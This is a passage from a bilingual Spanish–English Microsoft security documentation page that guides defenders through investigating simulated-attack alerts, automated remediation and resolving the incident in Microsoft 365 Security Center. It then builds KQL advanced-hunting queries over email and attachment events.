><span data-ttu-id="194f4-216">Debido a que esta alerta se basa en los modelos de aprendizaje de máquina que requieren un procesamiento adicional de back-end, puede tardar algún tiempo antes de ver esta alerta en el portal.</span><span class="sxs-lookup"><span data-stu-id="194f4-216">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="194f4-217">Observe que los detalles de la alerta incluyen la dirección IP externa, un indicador que puede usar como pivote para ampliar la investigación.</span><span class="sxs-lookup"><span data-stu-id="194f4-217">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="194f4-218">Haga clic en la dirección IP en el árbol de procesos de alerta para ver la página Detalles de la dirección IP.</span><span class="sxs-lookup"><span data-stu-id="194f4-218">Click the IP address in the alert process tree to view the IP address details page.</span></span>

![Captura de pantalla de la alerta para un comportamiento inesperado por un proceso ejecutado sin argumentos de línea de comandos](../../media/mtp/fig8.png) 

<span data-ttu-id="194f4-220">La siguiente figura muestra la página de detalles de la dirección IP seleccionada (haciendo clic en dirección IP en el árbol de proceso de alerta).</span><span class="sxs-lookup"><span data-stu-id="194f4-220">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="194f4-221">![Captura de pantalla de la página Detalles de la dirección IP](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="194f4-221">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>


<span data-ttu-id="194f4-222">**Alerta: reconocimiento de direcciones IP y usuarios (SMB) (origen: ATP de Azure)**</span><span class="sxs-lookup"><span data-stu-id="194f4-222">**Alert: User and IP address reconnaissance (SMB) (Source: Azure ATP)**</span></span>

<span data-ttu-id="194f4-223">La enumeración con el protocolo de bloque de mensajes del servidor (SMB) permite a los atacantes obtener información reciente de inicio de sesión de usuario que les ayude a moverse más adelante a través de la red para obtener acceso a una cuenta sensible específica.</span><span class="sxs-lookup"><span data-stu-id="194f4-223">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="194f4-224">En esta detección, se desencadena una alerta cuando se ejecuta la enumeración de sesión SMB en un controlador de dominio.</span><span class="sxs-lookup"><span data-stu-id="194f4-224">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Captura de pantalla de la alerta de ATP de Azure para el reconocimiento de direcciones IP y usuarios](../../media/mtp/fig10.png) 


### <a name="review-the-device-timeline-microsoft-defender-atp"></a><span data-ttu-id="194f4-226">Revisión de la escala de tiempo del dispositivo [Microsoft defender ATP]</span><span class="sxs-lookup"><span data-stu-id="194f4-226">Review the device timeline [Microsoft Defender ATP]</span></span>
<span data-ttu-id="194f4-227">Después de explorar las diversas alertas de este incidente, vuelva a la página incidente que investigó anteriormente.</span><span class="sxs-lookup"><span data-stu-id="194f4-227">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="194f4-228">Haga clic en la pestaña **dispositivos** en la página incidente para revisar los dispositivos que participan en este incidente tal y como lo notifica Microsoft defender ATP y Azure ATP.</span><span class="sxs-lookup"><span data-stu-id="194f4-228">Click the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender ATP and Azure ATP.</span></span>

<span data-ttu-id="194f4-229">Haga clic en el nombre del dispositivo en el que se llevó a cabo el ataque para abrir la página de la entidad de ese dispositivo específico.</span><span class="sxs-lookup"><span data-stu-id="194f4-229">Click the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="194f4-230">En esa página, puede ver las alertas que se han desencadenado y los eventos relacionados.</span><span class="sxs-lookup"><span data-stu-id="194f4-230">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="194f4-231">Haga clic en la pestaña **escala** de tiempo para abrir la escala de tiempo del dispositivo y ver todos los eventos y comportamientos que se observan en el dispositivo en orden cronológico, entremezclado con las alertas que se han generado.</span><span class="sxs-lookup"><span data-stu-id="194f4-231">Click the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Captura de pantalla de la escala de tiempo del dispositivo con comportamientos](../../media/mtp/fig11.png) 

<span data-ttu-id="194f4-233">La expansión de algunos de los comportamientos más interesantes proporciona detalles útiles, como árboles de procesos.</span><span class="sxs-lookup"><span data-stu-id="194f4-233">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="194f4-234">Por ejemplo, desplácese hacia abajo hasta encontrar la **inyección de proceso sospechoso**del evento de alerta observada.</span><span class="sxs-lookup"><span data-stu-id="194f4-234">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="194f4-235">Haga clic en el **powershell.exe insertado en notepad.exe evento Process** debajo de él para mostrar el árbol de proceso completo de este comportamiento en el gráfico **entidades del evento** del panel lateral.</span><span class="sxs-lookup"><span data-stu-id="194f4-235">Click the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="194f4-236">Use la barra de búsqueda para filtrar si es necesario.</span><span class="sxs-lookup"><span data-stu-id="194f4-236">Use the search bar for filtering if necessary.</span></span>

![Captura de pantalla del árbol de procesos para el comportamiento de creación de archivos de PowerShell seleccionado](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="194f4-238">Revisión de la información del usuario [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="194f4-238">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="194f4-239">En la página incidente, haga clic en la pestaña **usuarios** para mostrar la lista de usuarios implicados en el ataque.</span><span class="sxs-lookup"><span data-stu-id="194f4-239">On the incident page, click the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="194f4-240">La tabla contiene información adicional acerca de cada usuario, incluida la puntuación de la prioridad de la **investigación** de cada usuario.</span><span class="sxs-lookup"><span data-stu-id="194f4-240">The table contains additional information about each user, including each user’s **Investigation Priority** score.</span></span>

<span data-ttu-id="194f4-241">Haga clic en el nombre de usuario para abrir la página de perfil del usuario en la que se pueden realizar más investigaciones.</span><span class="sxs-lookup"><span data-stu-id="194f4-241">Click the username to open the user’s profile page where further investigation can be conducted.</span></span> <span data-ttu-id="194f4-242">[Obtenga más información acerca de la investigación de usuarios arriesgados](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span><span class="sxs-lookup"><span data-stu-id="194f4-242">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>
<br>
<span data-ttu-id="194f4-243">![Captura de pantalla de la página de usuario de Cloud App Security](../../media/mtp/fig13.png)</span><span class="sxs-lookup"><span data-stu-id="194f4-243">![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)</span></span>


## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="194f4-244">Investigación y corrección automatizadas</span><span class="sxs-lookup"><span data-stu-id="194f4-244">Automated investigation and remediation</span></span>
>[!NOTE]
><span data-ttu-id="194f4-245">Antes de guiarle a través de esta simulación, vea el siguiente vídeo para familiarizarse con el funcionamiento de la Autorrecuperación automatizada, dónde encontrarlo en el portal y cómo puede ayudarle en sus operaciones de seguridad:</span><span class="sxs-lookup"><span data-stu-id="194f4-245">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="194f4-246">Navegue hasta el incidente en el portal del centro de seguridad 365 de Microsoft.</span><span class="sxs-lookup"><span data-stu-id="194f4-246">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="194f4-247">La pestaña **investigaciones** de la página **incidente** muestra las investigaciones automatizadas que se desactivaron con Azure ATP y Microsoft defender ATP.</span><span class="sxs-lookup"><span data-stu-id="194f4-247">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Azure ATP and Microsoft Defender ATP.</span></span> <span data-ttu-id="194f4-248">La captura de pantalla siguiente muestra solo la investigación automatizada desencadenada por ATP de Microsoft defender.</span><span class="sxs-lookup"><span data-stu-id="194f4-248">The screenshot below displays only the automated investigation triggered by Microsoft Defender ATP.</span></span> <span data-ttu-id="194f4-249">De forma predeterminada, Microsoft defender ATP corrige automáticamente los artefactos que se encuentran en la cola y que requiere corrección.</span><span class="sxs-lookup"><span data-stu-id="194f4-249">By default, Microsoft Defender ATP automatically remediates the artifacts found in the queue which requires remediation.</span></span>

![Captura de pantalla de las investigaciones automatizadas relacionadas con el incidente](../../media/mtp/fig14.png)

<span data-ttu-id="194f4-251">Haga clic en la alerta que desencadenó una investigación para abrir la página Detalles de la **investigación** .</span><span class="sxs-lookup"><span data-stu-id="194f4-251">Click the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="194f4-252">Verá lo siguiente:</span><span class="sxs-lookup"><span data-stu-id="194f4-252">You’ll see the following:</span></span>
- <span data-ttu-id="194f4-253">Alertas que han activado la investigación automatizada.</span><span class="sxs-lookup"><span data-stu-id="194f4-253">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="194f4-254">Usuarios y dispositivos afectados.</span><span class="sxs-lookup"><span data-stu-id="194f4-254">Impacted users and devices.</span></span> <span data-ttu-id="194f4-255">Si se encuentran indicadores en dispositivos adicionales, estos dispositivos adicionales también se enumerarán.</span><span class="sxs-lookup"><span data-stu-id="194f4-255">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="194f4-256">Lista de evidencias.</span><span class="sxs-lookup"><span data-stu-id="194f4-256">List of evidence.</span></span> <span data-ttu-id="194f4-257">Las entidades que se han encontrado y analizado, como archivos, procesos, servicios, controladores y direcciones de red.</span><span class="sxs-lookup"><span data-stu-id="194f4-257">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="194f4-258">Estas entidades se analizan en busca de posibles relaciones con la alerta y se califican como benignas o malintencionadas.</span><span class="sxs-lookup"><span data-stu-id="194f4-258">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="194f4-259">Se han encontrado amenazas.</span><span class="sxs-lookup"><span data-stu-id="194f4-259">Threats found.</span></span> <span data-ttu-id="194f4-260">Amenazas conocidas que se encuentran durante la investigación.</span><span class="sxs-lookup"><span data-stu-id="194f4-260">Known threats that are found during the investigation.</span></span>

>[!NOTE]
><span data-ttu-id="194f4-261">Según el momento, es posible que la investigación automática todavía se esté ejecutando.</span><span class="sxs-lookup"><span data-stu-id="194f4-261">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="194f4-262">Espere unos minutos hasta que se complete el proceso antes de recopilar y analizar la evidencia y revise los resultados.</span><span class="sxs-lookup"><span data-stu-id="194f4-262">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="194f4-263">Actualice la página Detalles de la **investigación** para obtener las últimas conclusiones.</span><span class="sxs-lookup"><span data-stu-id="194f4-263">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Captura de pantalla de la página Detalles de la investigación](../../media/mtp/fig15.png)

<span data-ttu-id="194f4-265">Durante la investigación automatizada, el ATP de Microsoft defender ha identificado el proceso de notepad.exe, que se ha insertado como uno de los artefactos que requieren corrección.</span><span class="sxs-lookup"><span data-stu-id="194f4-265">During the automated investigation, Microsoft Defender ATP identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="194f4-266">Microsoft defender ATP detiene automáticamente la inyección del proceso sospechoso como parte de la corrección automatizada.</span><span class="sxs-lookup"><span data-stu-id="194f4-266">Microsoft Defender ATP automatically stops the suspicious process injection as part of the automated remediation.</span></span> 

<span data-ttu-id="194f4-267">Puede ver <i>notepad.exe</i> desaparecer de la lista de procesos en ejecución en el dispositivo de prueba.</span><span class="sxs-lookup"><span data-stu-id="194f4-267">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="194f4-268">Resolver el incidente</span><span class="sxs-lookup"><span data-stu-id="194f4-268">Resolve the incident</span></span>

<span data-ttu-id="194f4-269">Una vez completada la investigación y confirmada que se va a corregir, cierre el incidente.</span><span class="sxs-lookup"><span data-stu-id="194f4-269">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="194f4-270">Haga clic en **administrar incidente**.</span><span class="sxs-lookup"><span data-stu-id="194f4-270">Click **Manage incident**.</span></span> <span data-ttu-id="194f4-271">Establezca el estado para **resolver el incidente** y seleccione la clasificación correspondiente.</span><span class="sxs-lookup"><span data-stu-id="194f4-271">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="194f4-272">Una vez resuelto el incidente, se cerrarán todas las alertas asociadas en el centro de seguridad de Microsoft 365 y en los portales relacionados.</span><span class="sxs-lookup"><span data-stu-id="194f4-272">Once the incident is resolved, it will close all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![Captura de pantalla de la página incidentes con el panel abrir incidente de administración donde puede hacer clic en el conmutador para resolver el incidente](../../media/mtp/fig16.png) 

<br>
<span data-ttu-id="194f4-274">Esto engloba la simulación de ataques para los escenarios de administración de incidentes e investigación automatizada y corrección.</span><span class="sxs-lookup"><span data-stu-id="194f4-274">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="194f4-275">La siguiente simulación le guiará a través de la búsqueda proactiva de amenazas para archivos potencialmente malintencionados.</span><span class="sxs-lookup"><span data-stu-id="194f4-275">The next simulation will take you through proactive threat hunting for potentially-malicious files.</span></span> 

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="194f4-276">Escenario de caza avanzado</span><span class="sxs-lookup"><span data-stu-id="194f4-276">Advanced hunting scenario</span></span>

>[!NOTE]
><span data-ttu-id="194f4-277">Antes de guiarle a través de la simulación, vea el siguiente vídeo para comprender los conceptos de la caza avanzada, consulte dónde puede encontrarlo en el portal y sepa cómo puede ayudarle en sus operaciones de seguridad:</span><span class="sxs-lookup"><span data-stu-id="194f4-277">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="194f4-278">Requisitos del entorno de búsqueda</span><span class="sxs-lookup"><span data-stu-id="194f4-278">Hunting environment requirements</span></span>
<span data-ttu-id="194f4-279">Hay un solo buzón y un dispositivo interno necesarios para este escenario.</span><span class="sxs-lookup"><span data-stu-id="194f4-279">There is a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="194f4-280">También necesitará una cuenta de correo electrónico externa para enviar el mensaje de prueba.</span><span class="sxs-lookup"><span data-stu-id="194f4-280">You will also need an external email account to send the test message.</span></span>

1.  <span data-ttu-id="194f4-281">Compruebe que el inquilino haya [habilitado la protección contra amenazas de Microsoft](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span><span class="sxs-lookup"><span data-stu-id="194f4-281">Verify that your tenant has [enabled Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2.  <span data-ttu-id="194f4-282">Identifique el buzón de correo de destino que se usará para recibir correo electrónico.</span><span class="sxs-lookup"><span data-stu-id="194f4-282">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="194f4-283">a.</span><span class="sxs-lookup"><span data-stu-id="194f4-283">a.</span></span>  <span data-ttu-id="194f4-284">Este buzón debe ser supervisado por Office 365 ATP b.</span><span class="sxs-lookup"><span data-stu-id="194f4-284">This mailbox must be monitored by Office 365 ATP b.</span></span>  <span data-ttu-id="194f4-285">El dispositivo del requerimiento 3 necesita tener acceso a este buzón</span><span class="sxs-lookup"><span data-stu-id="194f4-285">The device from requirement 3 needs to access this mailbox</span></span>
3.  <span data-ttu-id="194f4-286">Configurar un dispositivo de prueba: a.</span><span class="sxs-lookup"><span data-stu-id="194f4-286">Configure a test device: a.</span></span>  <span data-ttu-id="194f4-287">Asegúrese de que usa la versión 1903 o posterior de Windows 10.</span><span class="sxs-lookup"><span data-stu-id="194f4-287">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="194f4-288">b.</span><span class="sxs-lookup"><span data-stu-id="194f4-288">b.</span></span>  <span data-ttu-id="194f4-289">Una el dispositivo de prueba al dominio de prueba.</span><span class="sxs-lookup"><span data-stu-id="194f4-289">Join the test device to the test domain.</span></span>
    <span data-ttu-id="194f4-290">c.</span><span class="sxs-lookup"><span data-stu-id="194f4-290">c.</span></span>  <span data-ttu-id="194f4-291">[Activa el antivirus de Windows Defender](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="194f4-291">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="194f4-292">Si tienes problemas para habilitar antivirus de Windows Defender, consulta [este tema de solución de problemas](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="194f4-292">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="194f4-293">d.</span><span class="sxs-lookup"><span data-stu-id="194f4-293">d.</span></span>  <span data-ttu-id="194f4-294">[Incorporado a protección contra amenazas avanzada de Microsoft defender (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="194f4-294">[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="194f4-295">Ejecutar la simulación</span><span class="sxs-lookup"><span data-stu-id="194f4-295">Run the simulation</span></span>
1.  <span data-ttu-id="194f4-296">Desde una cuenta de correo electrónico externa, envíe un correo electrónico al buzón identificado en el paso 2 de la sección requisitos del entorno de prueba.</span><span class="sxs-lookup"><span data-stu-id="194f4-296">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="194f4-297">Incluya datos adjuntos que se permitirán a través de cualquier directiva de filtro de correo electrónico existente.</span><span class="sxs-lookup"><span data-stu-id="194f4-297">Include an attachment that will be allowed through any existing email filter policies.</span></span>  <span data-ttu-id="194f4-298">Este archivo no tiene que ser malintencionado ni un ejecutable.</span><span class="sxs-lookup"><span data-stu-id="194f4-298">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="194f4-299">Los tipos de archivo sugeridos son <i>. pdf</i>, <i>. exe</i> (si se permite) o documento de Office como un archivo de Word.</span><span class="sxs-lookup"><span data-stu-id="194f4-299">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2.  <span data-ttu-id="194f4-300">Abra el correo electrónico enviado desde el dispositivo configurado tal y como se define en el paso 3 de la sección requisitos del entorno de prueba.</span><span class="sxs-lookup"><span data-stu-id="194f4-300">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="194f4-301">Abra los datos adjuntos o guarde el archivo en el dispositivo.</span><span class="sxs-lookup"><span data-stu-id="194f4-301">Either open the attachment or save the file to the device.</span></span>


<span data-ttu-id="194f4-302">**Ir a la caza**</span><span class="sxs-lookup"><span data-stu-id="194f4-302">**Go hunting**</span></span>
1.  <span data-ttu-id="194f4-303">Abra el portal de security.microsoft.com.</span><span class="sxs-lookup"><span data-stu-id="194f4-303">Open the security.microsoft.com portal.</span></span>
2.  <span data-ttu-id="194f4-304">Navegue a la **caza > la caza avanzada**.</span><span class="sxs-lookup"><span data-stu-id="194f4-304">Navigate to **Hunting > Advanced hunting**.</span></span>

    ![Captura de pantalla de la búsqueda avanzada en la barra de navegación del portal del centro de seguridad de M365](../../media/mtp/fig17.png) 

3.  <span data-ttu-id="194f4-306">Cree una consulta que se inicie al recopilar eventos de correo electrónico.</span><span class="sxs-lookup"><span data-stu-id="194f4-306">Build a query that starts by gathering email events.</span></span>
    <span data-ttu-id="194f4-307">a.</span><span class="sxs-lookup"><span data-stu-id="194f4-307">a.</span></span>  <span data-ttu-id="194f4-308">En el panel consulta, seleccione nuevo.</span><span class="sxs-lookup"><span data-stu-id="194f4-308">From the query pane, select New.</span></span>
    <span data-ttu-id="194f4-309">b.</span><span class="sxs-lookup"><span data-stu-id="194f4-309">b.</span></span>  <span data-ttu-id="194f4-310">Haga doble clic en la tabla EmailEvents del esquema.</span><span class="sxs-lookup"><span data-stu-id="194f4-310">Double-click on the EmailEvents table from the schema.</span></span>

```
EmailEvents 
```                                        

   <span data-ttu-id="194f4-311">c.</span><span class="sxs-lookup"><span data-stu-id="194f4-311">c.</span></span>   <span data-ttu-id="194f4-312">Cambie el período de tiempo a las últimas 24 horas.</span><span class="sxs-lookup"><span data-stu-id="194f4-312">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="194f4-313">Suponiendo que el correo electrónico que envió cuando ejecutó la simulación anterior se encontraba en las últimas 24 horas, en caso contrario, cambie el intervalo de tiempo.</span><span class="sxs-lookup"><span data-stu-id="194f4-313">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>
   <span data-ttu-id="194f4-314">![Captura de pantalla en la que puede cambiar el intervalo de tiempo.</span><span class="sxs-lookup"><span data-stu-id="194f4-314">![Screenshot of where you can change the time frame.</span></span> <span data-ttu-id="194f4-315">Abra el menú desplegable para elegir entre el intervalo de opciones de marco de tiempo.](../../media/mtp/fig18.png)</span><span class="sxs-lookup"><span data-stu-id="194f4-315">Open the drop-down menu to choose from range of time frame options](../../media/mtp/fig18.png)</span></span> 


   <span data-ttu-id="194f4-316">d.</span><span class="sxs-lookup"><span data-stu-id="194f4-316">d.</span></span>   <span data-ttu-id="194f4-317">Ejecutar la consulta.</span><span class="sxs-lookup"><span data-stu-id="194f4-317">Run the query.</span></span>  <span data-ttu-id="194f4-318">Puede tener muchos resultados en función del entorno de la prueba piloto.</span><span class="sxs-lookup"><span data-stu-id="194f4-318">You may have many results depending on the environment for the pilot.</span></span>  

>[!NOTE]
><span data-ttu-id="194f4-319">Consulte el paso siguiente para ver las opciones de filtrado para limitar la devolución de datos.</span><span class="sxs-lookup"><span data-stu-id="194f4-319">See the next step for filtering options to limit data return.</span></span>

   ![Captura de pantalla de los resultados de la consulta de búsqueda avanzada](../../media/mtp/fig19.png) 

>[!NOTE]
><span data-ttu-id="194f4-321">La búsqueda avanzada muestra los resultados de la consulta como datos tabulares.</span><span class="sxs-lookup"><span data-stu-id="194f4-321">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="194f4-322">También puede optar por ver los datos en otros tipos de formato, como gráficos.</span><span class="sxs-lookup"><span data-stu-id="194f4-322">You can also opt to view the data in other format types such as charts.</span></span>    

   <span data-ttu-id="194f4-323">e.</span><span class="sxs-lookup"><span data-stu-id="194f4-323">e.</span></span>   <span data-ttu-id="194f4-324">Mire los resultados y vea si puede identificar el correo electrónico que ha abierto.</span><span class="sxs-lookup"><span data-stu-id="194f4-324">Look at the results and see if you can identify the email you opened.</span></span>  <span data-ttu-id="194f4-325">El mensaje puede tardar hasta dos horas en aparecer en la caza avanzada.</span><span class="sxs-lookup"><span data-stu-id="194f4-325">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="194f4-326">Si el entorno de correo electrónico es grande y hay muchos resultados, es posible que desee usar la **opción Mostrar filtros** para buscar el mensaje.</span><span class="sxs-lookup"><span data-stu-id="194f4-326">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span> 

   <span data-ttu-id="194f4-327">En el ejemplo, el correo electrónico se envió desde una cuenta de Yahoo.</span><span class="sxs-lookup"><span data-stu-id="194f4-327">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="194f4-328">Haga clic en el **+** icono situado junto a **Yahoo.com** en la sección SenderFromDomain y, a continuación, haga clic en **aplicar** para agregar el dominio seleccionado a la consulta.</span><span class="sxs-lookup"><span data-stu-id="194f4-328">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span>  <span data-ttu-id="194f4-329">Debe usar el dominio o la cuenta de correo electrónico que se usó para enviar el mensaje de prueba en el paso 1 de ejecutar la simulación para filtrar los resultados.</span><span class="sxs-lookup"><span data-stu-id="194f4-329">You should use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span>  <span data-ttu-id="194f4-330">Vuelva a ejecutar la consulta para obtener un conjunto de resultados más pequeños para comprobar que se ve el mensaje de la simulación.</span><span class="sxs-lookup"><span data-stu-id="194f4-330">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>
   
   ![Captura de pantalla de los filtros.](../../media/mtp/fig20.png) 


```
EmailEvents 
| where SenderMailFromDomain == "yahoo.com"
```

   <span data-ttu-id="194f4-333">f.</span><span class="sxs-lookup"><span data-stu-id="194f4-333">f.</span></span>   <span data-ttu-id="194f4-334">Haga clic en las filas resultantes de la consulta para que pueda inspeccionar el registro.</span><span class="sxs-lookup"><span data-stu-id="194f4-334">Click the resulting rows from the query so you can inspect the record.</span></span>
   <span data-ttu-id="194f4-335">![Captura de pantalla del panel lateral de registro de inspección que se abre cuando se selecciona un resultado de búsqueda avanzada](../../media/mtp/fig21.png)</span><span class="sxs-lookup"><span data-stu-id="194f4-335">![Screenshot of the inspect record side panel which opens up when an advanced hunting result is selected](../../media/mtp/fig21.png)</span></span> 


4.  <span data-ttu-id="194f4-336">Ahora que ya ha comprobado que puede ver el correo electrónico, agregue un filtro para los datos adjuntos.</span><span class="sxs-lookup"><span data-stu-id="194f4-336">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="194f4-337">Céntrese en todos los correos electrónicos con datos adjuntos en el entorno.</span><span class="sxs-lookup"><span data-stu-id="194f4-337">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="194f4-338">Para este escenario, céntrese en los correos electrónicos entrantes, no en los que se envían desde el entorno.</span><span class="sxs-lookup"><span data-stu-id="194f4-338">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="194f4-339">Quite los filtros que haya agregado para buscar el mensaje y agregar "| donde **AttachmentCount > 0** y **EmailDirection**  ==  **"entrante" "**</span><span class="sxs-lookup"><span data-stu-id="194f4-339">Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**</span></span>

<span data-ttu-id="194f4-340">La siguiente consulta le mostrará el resultado con una lista más corta que la consulta inicial para todos los eventos de correo electrónico:</span><span class="sxs-lookup"><span data-stu-id="194f4-340">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"

```

5.  <span data-ttu-id="194f4-341">A continuación, incluya la información sobre los datos adjuntos (por ejemplo, el nombre de archivo, los hash) en el conjunto de resultados.</span><span class="sxs-lookup"><span data-stu-id="194f4-341">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="194f4-342">Para ello, únase a la tabla **EmailAttachmentInfo** .</span><span class="sxs-lookup"><span data-stu-id="194f4-342">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="194f4-343">Los campos comunes que se usan para la combinación, en este caso son **NetworkMessageId** y **RecipientObjectId**.</span><span class="sxs-lookup"><span data-stu-id="194f4-343">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

<span data-ttu-id="194f4-344">La siguiente consulta también incluye una línea adicional "| **Project-Rename EmailTimestamp = timestamp**"que ayudará a identificar qué marca de tiempo está relacionada con el correo electrónico frente a las marcas de tiempo relacionadas con las acciones de archivo que se agregarán en el paso siguiente.</span><span class="sxs-lookup"><span data-stu-id="194f4-344">The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that will help identify which timestamp was related to the email versus timestamps related to file actions which you will add in the next step.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
```

6.  <span data-ttu-id="194f4-345">A continuación, use el valor **SHA256** de la tabla **EmailAttachmentInfo** para buscar **DeviceFileEvents** (acciones de archivo que se han producido en el extremo) para ese hash.</span><span class="sxs-lookup"><span data-stu-id="194f4-345">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span>  <span data-ttu-id="194f4-346">El campo común aquí será el hash SHA256 para los datos adjuntos.</span><span class="sxs-lookup"><span data-stu-id="194f4-346">The common field here will be the SHA256 hash for the attachment.</span></span>

